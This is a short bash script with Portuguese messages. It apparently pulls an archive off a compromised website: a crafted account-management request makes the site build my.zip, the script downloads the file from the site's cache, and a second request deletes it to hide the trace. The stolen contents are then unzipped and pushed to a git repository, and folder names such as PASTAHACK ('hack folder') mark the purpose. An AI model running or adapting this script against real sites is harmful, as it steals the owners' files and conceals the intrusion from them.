#!/usr/bin/env bash
TEMPO=$(date +"%F%H:%M:%S")
PASTAHACK="/home/souzaariick/belo"
urlpadrao="URL_WEBSITE"
nomepasta="PASTA"
caminhohacked="CAMINHO_ARQUIVO_HACKED"

cd $PASTAHACK

echo ">> Iniciando Programa"
url=$urlpadrao"?subtopic=accountmanagement&login=register"
curl $url -I -s
echo ">> Criação de arquivo my.zip Finalizado"

echo ">> Iniciando download arquivo."
newurl=$urlpadrao"/cache/my.zip"
curl $newurl -O
echo ">> Download Finalizado"

echo ">> Iniciando Remoção de arquivo my.zip da pasta cache"
finishurl=$urlpadrao"?subtopic=accountmanagement&login=unregister"
curl $finishurl -I -s
echo ">> Remoção finalizada com sucesso"

unzip -o my.zip

rm -R $nomepasta"/.git"
mv my.zip $caminhohacked""$TEMPO".zip"

git add .
git commit -am "$TEMPO"
git push -u origin master